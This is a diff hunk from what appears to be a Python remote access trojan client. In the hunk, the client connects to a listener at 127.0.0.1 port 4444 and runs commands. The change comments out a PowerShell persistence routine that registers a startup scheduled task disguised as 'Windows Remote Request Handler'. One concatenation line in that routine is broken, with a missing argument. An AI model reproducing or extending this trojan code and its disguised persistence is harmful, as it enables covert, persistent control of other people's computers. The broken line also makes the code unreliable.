@@ -610,25 +610,25 @@ rat = RAT_CLIENT('127.0.0.1', 4444)
 
 if __name__ == '__main__':
     # Use triple quotes string literal to span PowerShell command multiline
-    STR_CMD = """
-    $action = New-ScheduledTaskAction -Execute """ + sys.executable + """.exe -Argument """ +  + """
-    $description = ""
-    $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable
-    $taskName = "Windows Remote Request Handler"
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger | Out-Null
-    """
+    #STR_CMD = """
+    #$action = New-ScheduledTaskAction -Execute """ + sys.executable + """.exe -Argument """ +  + """
+    #$description = ""
+    #$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable
+    #$taskName = "Windows Remote Request Handler"
+    #$trigger = New-ScheduledTaskTrigger -AtStartup
+    #Register-ScheduledTask -TaskName $taskName -Description $description -Action $action -Settings $settings -Trigger $trigger | Out-Null
+    #"""
 
     # Use a list to make it easier to pass argument to subprocess
-    listProcess = [
-        "powershell.exe",
-        "-NoExit",
-        "-NoProfile",
-        "-Command",
-        STR_CMD
-    ]
+    #listProcess = [
+    #    "powershell.exe",
+    #    "-NoExit",
+    #    "-NoProfile",
+    #    "-Command",
+    #    STR_CMD
+    #]
 
     # Enjoy the magic
-    subprocess.run(listProcess, check=True)
+    #subprocess.run(listProcess, check=True)
     rat.build_connection()
     rat.execute()
